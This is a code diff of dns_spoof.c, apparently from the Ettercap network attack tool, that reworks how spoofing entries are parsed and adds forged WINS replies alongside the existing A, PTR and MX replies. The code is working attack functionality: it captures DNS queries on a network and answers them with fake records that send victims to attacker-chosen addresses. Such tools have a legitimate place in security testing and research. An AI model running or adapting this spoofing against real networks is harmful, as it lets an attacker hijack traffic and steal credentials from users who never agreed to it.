@@ -17,7 +17,7 @@
     along with this program; if not, write to the Free Software
     Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 
-    $Id: dns_spoof.c,v 1.10 2004/10/14 12:43:02 alor Exp $
+    $Id: dns_spoof.c,v 1.11 2004/10/18 07:53:39 alor Exp $
 */
 
 
@@ -30,6 +30,10 @@
 
 #include <stdlib.h>
 #include <string.h>
+
+#ifndef ns_t_wins
+#define ns_t_wins 0xFF01      /* WINS name lookup */
+#endif
 
 /* globals */
 
@@ -65,9 +69,7 @@ struct dns_header {
 };
 
 struct dns_spoof_entry {
-   int type;
-      #define TYPE_PTR_A   0
-      #define TYPE_MX      1
+   int   type;   /* ns_t_a, ns_t_mx, ns_t_ptr, ns_t_wins */
    char *name;
    struct ip_addr ip;
    SLIST_ENTRY(dns_spoof_entry) next;
@@ -82,9 +84,12 @@ static int dns_spoof_init(void *);
 static int dns_spoof_fini(void *);
 static int load_db(void);
 static void dns_spoof(struct packet_object *po);
-static int get_spoofed_a(char *a, struct ip_addr **ip);
-static int get_spoofed_ptr(char *arpa, char **a);
-static int get_spoofed_mx(char *a, struct ip_addr **ip);
+static int parse_line(const char *str, int line, int *type_p, char **ip_p, char **name_p);
+static int get_spoofed_a(const char *a, struct ip_addr **ip);
+static int get_spoofed_ptr(const char *arpa, char **a);
+static int get_spoofed_mx(const char *a, struct ip_addr **ip);
+static int get_spoofed_wins(const char *a, struct ip_addr **ip);
+static const char *type_str(int type);
 static void dns_spoof_dump(void);
 
 /* plugin operations */
@@ -116,7 +121,6 @@ int plugin_load(void *handle)
       return -EINVALID;
    
    dns_spoof_dump();
-
    return plugin_register(handle, &dns_spoof_ops);
 }
 
@@ -152,9 +156,8 @@ static int load_db(void)
    struct in_addr ipaddr;
    FILE *f;
    char line[128];
-   char *ptr, *ip, *name, *p;
+   char *ptr, *ip, *name;
    int lines = 0, type;
-   char *tok;
    
    /* open the file */
    f = open_data("share", ETTER_DNS, FOPEN_READ_TEXT);
@@ -170,30 +173,16 @@ static int load_db(void)
 
       /* trim comments */
       if ( (ptr = strchr(line, '#')) )
-         *ptr = 0;
+         *ptr = '\0';
 
       /* skip empty lines */
-      if (!strlen(line))
+      if (!*line || *line == '\r' || *line == '\n')
          continue;
       
-      /* check if it is an MX record */
-      if (!strncasecmp(line, "MX ", 3)) {
-         type = TYPE_MX;
-         p = line + 3;
-         /* get the name and the ip */
-         if ((name = ec_strtok(p, "\t ", &tok)) == NULL || (ip = ec_strtok(NULL, " #\r\n", &tok)) == NULL)
-            continue;
+      /* strip apart the line */
+      if (!parse_line(line, lines, &type, &ip, &name))
+         continue;
         
-      } else {
-         type = TYPE_PTR_A;
-         p = line;
-         
-         /* get the ip and the name */
-         if ((ip = ec_strtok(p, "\t ", &tok)) == NULL || (name = ec_strtok(NULL, " #\r\n", &tok)) == NULL)
-            continue;
-      }
-      
-     
       /* convert the ip address */
       if (inet_aton(ip, &ipaddr) == 0) {
          USER_MSG("%s:%d Invalid ip address\n", ETTER_DNS, lines);
@@ -217,7 +206,60 @@ static int load_db(void)
    return ESUCCESS;
 }
 
-/* 
+/*
+ * Parse line on format "<name> <type> <IP-addr>".
+ */
+static int parse_line (const char *str, int line, int *type_p, char **ip_p, char **name_p)
+{
+   static char name[100+1];
+   static char ip[20+1];
+   char type[10+1];
+
+/* DEBUG_MSG("%s:%d str '%s'", ETTER_DNS, line, str); */
+
+   if (sscanf(str,"%100s %10s %20[^\r\n# ]", name, type, ip) != 3) {
+      USER_MSG("%s:%d Invalid entry %s\n", ETTER_DNS, str, line);
+      return (0);
+   }
+
+   if (!strcasecmp(type,"PTR")) {
+      if (strpbrk(name,"*?[]")) {
+         USER_MSG("%s:%d Wildcards in PTR records are not allowed; %s\n",
+                  ETTER_DNS, line, str);
+         return (0);
+      }
+      *type_p = ns_t_ptr;
+      *name_p = name;
+      *ip_p = ip;
+      return (1);
+   }
+
+   if (!strcasecmp(type,"A")) {
+      *type_p = ns_t_a;
+      *name_p = name;
+      *ip_p = ip;
+      return (1);
+   }
+
+   if (!strcasecmp(type,"MX")) {
+      *type_p = ns_t_mx;
+      *name_p = name;
+      *ip_p = ip;
+      return (1);
+   }
+
+   if (!strcasecmp(type,"WINS")) {
+      *type_p = ns_t_wins;
+      *name_p = name;
+      *ip_p = ip;
+      return (1);
+   }
+
+   USER_MSG("%s:%d Unknown record type %s\n", ETTER_DNS, line, type);
+   return (0);
+}
+
+/*
  * parse the packet and send the fake reply
  */
 static void dns_spoof(struct packet_object *po)
@@ -227,7 +269,8 @@ static void dns_spoof(struct packet_object *po)
    char name[NS_MAXDNAME];
    int name_len;
    u_char *q;
-   int16 class, type;
+   int16 class;
+   u_int16 type;
 
    dns = (struct dns_header *)po->DATA.data;
    data = (u_char *)(dns + 1);
@@ -355,6 +398,36 @@ static void dns_spoof(struct packet_object *po)
          send_dns_reply(po->L4.src, &po->L3.dst, &po->L3.src, po->L2.src, ntohs(dns->id), answer, sizeof(answer), 1);
          
          USER_MSG("dns_spoof: MX [%s] spoofed to [%s]\n", name, ip_addr_ntoa(reply, tmp));
+
+      /* it is an WINS query (NetBIOS-name to ip) */
+      } else if (type == ns_t_wins) {
+
+         struct ip_addr *reply;
+         u_int8 answer[(q - data) + 16];
+         char *p = answer + (q - data);
+         char tmp[MAX_ASCII_ADDR_LEN];
+
+         /* found the reply in the list */
+         if (get_spoofed_wins(name, &reply) != ESUCCESS)
+            return;
+         /*
+          * fill the buffer with the content of the request
+          * we will append the answer just after the request
+          */
+         memcpy(answer, data, q - data);
+
+         /* prepare the answer */
+         memcpy(p, "\xc0\x0c", 2);                        /* compressed name offset */
+         memcpy(p + 2, "\xff\x01", 2);                    /* type WINS */
+         memcpy(p + 4, "\x00\x01", 2);                    /* class IN */
+         memcpy(p + 6, "\x00\x00\x0e\x10", 4);            /* TTL (1 hour) */
+         memcpy(p + 10, "\x00\x04", 2);                   /* datalen */
+         ip_addr_cpy(p + 12, reply);                      /* data */
+
+         /* send the fake reply */
+         send_dns_reply(po->L4.src, &po->L3.dst, &po->L3.src, po->L2.src, ntohs(dns->id), answer, sizeof(answer), 1);
+
+         USER_MSG("dns_spoof: WINS [%s] spoofed to [%s]\n", name, ip_addr_ntoa(reply, tmp));
       }
    }
 }
@@ -363,12 +436,12 @@ static void dns_spoof(struct packet_object *po)
 /*
  * return the ip address for the name
  */
-static int get_spoofed_a(char *a, struct ip_addr **ip)
+static int get_spoofed_a(const char *a, struct ip_addr **ip)
 {
    struct dns_spoof_entry *d;
 
    SLIST_FOREACH(d, &dns_spoof_head, next) {
-      if (d->type == TYPE_PTR_A && match_pattern(a, d->name)) {
+      if (d->type == ns_t_a && match_pattern(a, d->name)) {
 
          /* return the pointer to the struct */
          *ip = &d->ip;
@@ -383,7 +456,7 @@ static int get_spoofed_a(char *a, struct ip_addr **ip)
 /* 
  * return the name for the ip address 
  */
-static int get_spoofed_ptr(char *arpa, char **a)
+static int get_spoofed_ptr(const char *arpa, char **a)
 {
    struct dns_spoof_entry *d;
    struct ip_addr ptr;
@@ -409,9 +482,9 @@ static int get_spoofed_ptr(char *arpa, char **a)
        * we cannot return whildcards in the reply, 
        * so skip the entry if the name contains a '*'
        */
-      if (d->type == TYPE_PTR_A && !ip_addr_cmp(&ptr, &d->ip) && strchr(d->name, '*') == NULL) {
+      if (d->type == ns_t_ptr && !ip_addr_cmp(&ptr, &d->ip)) {
 
-         /* return the pointer to the struct */
+         /* return the pointer to the name */
          *a = d->name;
          
          return ESUCCESS;
@@ -424,12 +497,12 @@ static int get_spoofed_ptr(char *arpa, char **a)
 /*
  * return the ip address for the name (MX records)
  */
-static int get_spoofed_mx(char *a, struct ip_addr **ip)
+static int get_spoofed_mx(const char *a, struct ip_addr **ip)
 {
    struct dns_spoof_entry *d;
 
    SLIST_FOREACH(d, &dns_spoof_head, next) {
-      if (d->type == TYPE_MX && match_pattern(a, d->name)) {
+      if (d->type == ns_t_mx && match_pattern(a, d->name)) {
 
          /* return the pointer to the struct */
          *ip = &d->ip;
@@ -439,6 +512,34 @@ static int get_spoofed_mx(char *a, struct ip_addr **ip)
    }
    
    return -ENOTFOUND;
+}
+
+/*
+ * return the ip address for the name (NetBIOS WINS records)
+ */
+static int get_spoofed_wins(const const char *a, struct ip_addr **ip)
+{
+   struct dns_spoof_entry *d;
+
+   SLIST_FOREACH(d, &dns_spoof_head, next) {
+      if (d->type == ns_t_wins && match_pattern(a, d->name)) {
+
+         /* return the pointer to the struct */
+         *ip = &d->ip;
+
+         return ESUCCESS;
+      }
+   }
+
+   return -ENOTFOUND;
+}
+
+static const char *type_str (int type)
+{
+   return (type == ns_t_a    ? "A" :
+           type == ns_t_ptr  ? "PTR" :
+           type == ns_t_mx   ? "MX" :
+           type == ns_t_wins ? "WINS" : "??");
 }
 
 static void dns_spoof_dump(void)
@@ -451,7 +552,8 @@ static void dns_spoof_dump(void)
    DEBUG_MSG("dns_spoof entries:");
    SLIST_FOREACH(d, &dns_spoof_head, next) {
       if (ntohs(d->ip.addr_type) == AF_INET)
-         DEBUG_MSG("  %s -> [%s], type %d", d->name, int_ntoa(d->ip.addr), d->type);
+         DEBUG_MSG("  %s -> [%s], type %s", d->name, int_ntoa(d->ip.addr),
+                   type_str(d->type));
       else
          DEBUG_MSG("  %s -> ??", d->name);   /* IPv6 possible? */
    }
